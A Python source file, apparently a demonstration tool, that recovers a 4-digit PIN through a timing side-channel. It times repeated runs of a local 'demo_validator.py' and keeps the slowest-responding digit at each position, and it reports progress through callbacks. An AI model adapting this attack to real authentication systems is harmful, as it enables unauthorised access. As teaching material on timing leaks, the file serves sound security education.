import statistics
import subprocess
import sys
import time

from pathlib import Path


PIN_LENGTH = 4
SAMPLES_PER_GUESS = 3

VALIDATOR_PATH = (
    Path(__file__)
    .resolve()
    .parent
    / "demo_validator.py"
)


def measure_guess(
    guess,
    samples=SAMPLES_PER_GUESS
):
    measurements = []

    for _ in range(samples):

        start = time.perf_counter()

        subprocess.run(
            [
                sys.executable,
                str(VALIDATOR_PATH),
                guess
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        elapsed = (
            time.perf_counter()
            - start
        ) * 1000

        measurements.append(
            elapsed
        )

    return statistics.median(
        measurements
    )


def recover_pin(
    progress_callback=None
):
    prefix = ""
    steps = []

    for position in range(PIN_LENGTH):

        candidates = []

        for digit in "0123456789":

            guess = (
                prefix
                + digit
            ).ljust(
                PIN_LENGTH,
                "0"
            )

            milliseconds = measure_guess(
                guess
            )

            measurement = {
                "position": position + 1,
                "digit": digit,
                "guess": guess,
                "milliseconds": round(
                    milliseconds,
                    2
                )
            }

            candidates.append(
                measurement
            )

            if progress_callback:

                progress_callback({
                    "type": "measurement",
                    **measurement
                })

        best_candidate = max(
            candidates,
            key=lambda item:
                item["milliseconds"]
        )

        prefix += best_candidate[
            "digit"
        ]

        step = {
            "position": position + 1,
            "selected_digit":
                best_candidate["digit"],
            "prefix": prefix,
            "candidates": sorted(
                candidates,
                key=lambda item:
                    item["milliseconds"],
                reverse=True
            )
        }

        steps.append(step)

        if progress_callback:

            progress_callback({
                "type": "digit_found",
                "step": step
            })

    result = {
        "pin": prefix,
        "steps": steps
    }

    if progress_callback:

        progress_callback({
            "type": "complete",
            "pin": prefix
        })

    return result